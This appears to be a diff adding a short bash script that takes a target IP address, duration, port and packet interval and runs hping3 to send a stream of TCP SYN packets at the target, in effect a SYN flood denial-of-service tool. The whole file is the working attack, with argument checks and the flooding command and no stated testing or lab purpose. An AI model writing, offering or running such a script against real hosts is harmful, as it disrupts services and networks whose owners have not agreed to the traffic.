@@ -1,0 +1,34 @@
+#!/bin/bash
+
+if [ -z "$1" ]
+  then
+    echo "No target IP address provided"
+    exit 1;
+  else
+    TARGET=$1
+fi
+
+if [[ $2 ]] && [[ $2 -eq $2 ]] && [[ $2 -le 300 ]] && [[ $2 -ge 1 ]]
+then
+	DURATION=$2
+else
+	echo "Invalid duration." && exit 1
+fi
+
+if [[ $3 ]] && [[ $3 -eq $3 ]] && [[ $3 -le 65535 ]] && [[ $3 -ge 1 ]]
+then
+	PORT=$3
+else
+	echo "Invalid port." && exit 1
+fi
+
+if [ -z "$4" ]
+  then
+    echo "No packet speed provided."
+    exit 1;
+  else
+    SPEED=$4
+fi
+
+# send TCP packets with the SYN flag (-S) to port $PORT on the target ($1)
+timeout ${DURATION}s hping3 -S -i $SPEED -p $PORT $TARGET
